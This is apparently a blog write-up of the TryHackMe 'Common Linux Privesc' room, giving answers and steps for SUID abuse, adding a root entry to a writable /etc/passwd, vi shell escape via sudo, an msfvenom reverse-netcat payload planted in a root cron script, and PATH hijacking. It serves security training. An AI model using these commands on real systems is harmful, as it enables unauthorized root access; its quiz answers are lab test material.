---
title: "Common Linux Privesc — Tryhackme Write-up"
date: 2024-11-04
platform: tryhackme
source_file: "2024-11-04_Common-Linux-Privesc---Tryhackme-Write-up-52e15c5af6fa.html"
---

---

### Common Linux Privesc — Tryhackme Write-up

![](https://cdn-images-1.medium.com/max/800/1*LUpQNZA-610GTIzEBtRzwQ.png)![](https://cdn-images-1.medium.com/max/800/0*De4cH2sDXaDo7KXh.png)

### Task 1 : Get Connected

This room will explore common Linux Privilege Escalation vulnerabilities and techniques, but in order to do that, we’ll need to do a few things first!

1. Deploy the machine
2. Connect to the TryHackMe OpenVPN Server (See <https://tryhackme.com/access> for help!) or deploy the AttackBox

**Deploy the machine**

No Answer Needed

### Task 2 : Understanding Privesc

**Read the information about privilege escalation**

No Answer Needed

### Task 3 : Direction of Privilege Escalation

**Privilege Tree:**

![](https://cdn-images-1.medium.com/max/800/0*wqRT7xSiTKEodXXh)

**There are two main privilege escalation variants:**

**Horizontal privilege escalation:** This is where you expand your reach over the compromised system by taking over a different user who is on the same privilege level as you. For instance, a normal user hijacking another normal user (rather than elevating to super user). This allows you to inherit whatever files and access that user has. This can be used, for example, to gain access to another normal privilege user, that happens to have an SUID file attached to their home directory (more on these later) which can then be used to get super user access. [Travel sideways on the tree]

**Vertical privilege escalation (privilege elevation):** This is where you attempt to gain higher privileges or access, with an existing account that you have already compromised. For local privilege escalation attacks this might mean hijacking an account with administrator privileges or root privileges. [Travel up on the tree]

**Understand the difference between Horizontal and Vertical privilege escalation.**

No Answer Needed

### Task 4 : Enumeration

First, lets SSH into the target machine, using the credentials user3:password. This is to simulate getting a foothold on the system as a normal privilege user.

**What is the target’s hostname?**

polobox

**Look at the output of /etc/passwd how many “user[x]” are there on the system?**

8

**How many available shells are there on the system?**

4

**What is the name of the bash script that is set to run every 5 minutes by cron?**

autoscript.sh

**What critical file has had its permissions changed to allow some users to write to it?**

/etc/passwd

**Well done! Bear the results of the enumeration stage in mind as we continue to exploit the system!**

No Answer Needed

### Task 5 : Abusing SUID/GUID Files

**What is the path of the file in user3’s directory that stands out to you?**

/home/user3/shell

**We know that “shell” is an SUID bit file, therefore running it will run the script as a root user! Lets run it!**

**We can do this by running: “./shell”**

No Answer Needed

**Congratulations! You should now have a shell as root user, well done!**

No Answer Needed

### **Task 6 : Exploiting Writeable /etc/passwd**

**First, let’s exit out of root from our previous task by typing “exit”. Then use “su” to swap to user7, with the password “password”**

**Having read the information above, what direction privilege escalation is this attack?**

vertical

**Before we add our new user, we first need to create a compliant password hash to add! We do this by using the command: “openssl passwd -1 -salt [salt] [password]”**

**What is the hash created by using this command with the salt, “new” and the password “123”?**

$1$new$p7ptkEKU1HnaHpRtzNizS1

**Great! Now we need to take this value, and create a new root user account. What would the /etc/passwd entry look like for a root user with the username “new” and the password hash we created before?**

new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash

**Great! Now you’ve got everything you need. Just add that entry to the end of the /etc/passwd file!**

No Answer Needed

**Now, use “su” to login as the “new” account, and then enter the password. If you’ve done everything correctly- you should be greeted by a root prompt! Congratulations!**

No Answer Needed

### Task 7 : Escaping Vi Editor

**Sudo -l**

This exploit comes down to how effective our user account enumeration has been. Every time you have access to an account during a CTF scenario, you should use **“sudo -l”** to list what commands you’re able to use as a super user on that account. Sometimes, like this, you’ll find that you’re able to run certain commands as a root user without the root password. This can enable you to escalate privileges.

**Escaping Vi**

Running this command on the “user8” account shows us that this user can run vi with root privileges. This will allow us to escape vim in order to escalate privileges and get a shell as the root user!

**Misconfigured Binaries and GTFOBins**

If you find a misconfigured binary during your enumeration, or when you check what binaries a user account you have access to can access, a good place to look up how to exploit them is GTFOBins. GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions. It provides a really useful breakdown of how to exploit a misconfigured binary and is the first place you should look if you find one on a CTF or Pentest.

[**GTFOBins**  
*GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured…*gtfobins.github.io](https://gtfobins.github.io/ "https://gtfobins.github.io/")

**First, let’s exit out of root from our previous task by typing “exit”. Then use “su” to swap to user8, with the password “password**

No Answer Needed

**Let’s use the “sudo -l” command, what does this user require (or not require) to run vi as root?**

NOPASSWD

**So, all we need to do is open vi as root, by typing “sudo vi” into the terminal.**

No Answer Needed

**Now, type “:!sh” to open a shell!**

No Answer Needed

### Task 8 : Exploiting Crontab

**What is Cron?**

The Cron daemon is a long-running process that executes commands at specific dates and times. You can use this to schedule activities, either as one-time events or as recurring tasks. You can create a crontab file containing commands and instructions for the Cron daemon to execute.

**How to view what Cronjobs are active.**

We can use the command **“cat /etc/crontab”** to view what cron jobs are scheduled. This is something you should always check manually whenever you get a chance, especially if LinEnum, or a similar script, doesn’t find anything.

**Format of a Cronjob**

Cronjobs exist in a certain format, being able to read that format is important if you want to exploit a cron job.

# = ID

m = Minute

h = Hour

dom = Day of the month

mon = Month

dow = Day of the week

user = What user the command will run as

command = What command should be run

For Example,

**# m h dom mon dow user command**

17 \* 1 \* \* \* root cd / && run-parts — report /etc/cron.hourly

**How can we exploit this?**

We know from our LinEnum scan, that the file autoscript.sh, on user4’s Desktop is scheduled to run every five minutes. It is owned by root, meaning that it will run with root privileges, despite the fact that we can write to this file. The task then is to create a command that will return a shell and paste it in this file. When the file runs again in five minutes the shell will be running as root.

**Let’s do it!**

**First, let’s exit out of root from our previous task by typing “exit”. Then use “su” to swap to user4, with the password “password”**

No Answer Needed

**Now, on our host machine- let’s create a payload for our cron exploit using msfvenom.**

No Answer Needed

**What is the flag to specify a payload in msfvenom?**

-p

**Create a payload using: “msfvenom -p cmd/unix/reverse\_netcat lhost=LOCALIP lport=8888 R”**

No Answer Needed

**What directory is the “autoscript.sh” under?**

/home/user4/Desktop

**Lets replace the contents of the file with our payload using: “echo [MSFVENOM OUTPUT] > autoscript.sh”**

No Answer Needed

**After copying the code into autoscript.sh file we wait for cron to execute the file, and start our netcat listener using: “nc -lvnp 8888” and wait for our shell to land!**

No Answer Needed

**After about 5 minutes, you should have a shell as root land in your netcat listening session! Congratulations!**

No Answer Needed

### Task 9 : Exploiting PATH Variable

**What is PATH?**

PATH is an environmental variable in Linux and Unix-like operating systems which specifies directories that hold executable programs. When the user runs any command in the terminal, it searches for executable files with the help of the PATH Variable in response to commands executed by a user.

It is very simple to view the Path of the relevant user with help of the command **“echo $PATH”**.

**How does this let us escalate privileges?**

Let’s say we have an SUID binary. Running it, we can see that it’s calling the system shell to do a basic process like list processes with “ps”. Unlike in our previous SUID example, in this situation we can’t exploit it by supplying an argument for command injection, so what can we do to try and exploit this?

We can re-write the PATH variable to a location of our choosing! So when the SUID binary calls the system shell to run an executable, it runs one that we’ve written instead!

As with any SUID file, it will run this command with the same privileges as the owner of the SUID file! If this is root, using this method we can run whatever commands we like as root!

**Let’s do it!**

**Going back to our local ssh session, not the netcat root session, you can close that now, let’s exit out of root from our previous task by typing “exit”. Then use “su” to swap to user5, with the password “password”**

No Answer Needed

**Let’s go to user5’s home directory, and run the file “script”. What command do we think that it’s executing?**

ls

**Now we know what command to imitate, let’s change directory to “tmp”.**

No Answer Needed

**Now we’re inside tmp, let’s create an imitation executable. The format for what we want to do is:**

**echo “[whatever command we want to run]” > [name of the executable we’re imitating]**

**What would the command look like to open a bash shell, writing to a file with the name of the executable we’re imitating**

echo “/bin/bash” > ls

**Great! Now we’ve made our imitation, we need to make it an executable. What command do we execute to do this?**

chmod +x ls

Now, we need to change the PATH variable, so that it points to the directory where we have our imitation **“ls”** stored! We do this using the command **“export PATH=/tmp:$PATH”**

Note, this will cause you to open a bash prompt every time you use **“ls”**. If you need to use **“ls”** before you finish the exploit, use **“/bin/ls”** where the real **“ls”** executable is.

Once you’ve finished the exploit, you can exit out of root and use **“export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:$PATH”** to reset the PATH variable back to default, letting you use **“ls”** again!

No Answer Needed

Now, change directory back to user5’s home directory.

No Answer Needed

Now, run the “script” file again, you should be sent into a root bash prompt! Congratulations!

No Answer Needed

### Task 10 : Expanding Your Knowledge

**Further Learning**

There is never a “magic” answer in the huge area that is Linux Privilege Escalation. This is simply a few examples of basic things to watch out for when trying to escalate privileges*.*The only way to get better at it, is to practice and build up experience. Checklists are a good way to make sure you haven’t missed anything during your enumeration stage, and also to provide you with a resource to check how to do things if you forget exactly what commands to use.

Below is a list of good checklists to apply to CTF or penetration test use cases.Although I encourage you to make your own using CherryTree or whatever notes application you prefer.

* <https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md>
* <https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md>
* <https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html>
* <https://payatu.com/blog/a-guide-to-linux-privilege-escalation/>

**Thank you**

Thanks for taking the time to work through this room, I wish you the best of luck in future.

~ Polo

Well done, you did it!

No Answer Needed

HAPPY HACKING :)

**🧑‍💻 FOLLOW FOR MORE …….**

[Jawstar](https://medium.com/u/c42b7c126e68)
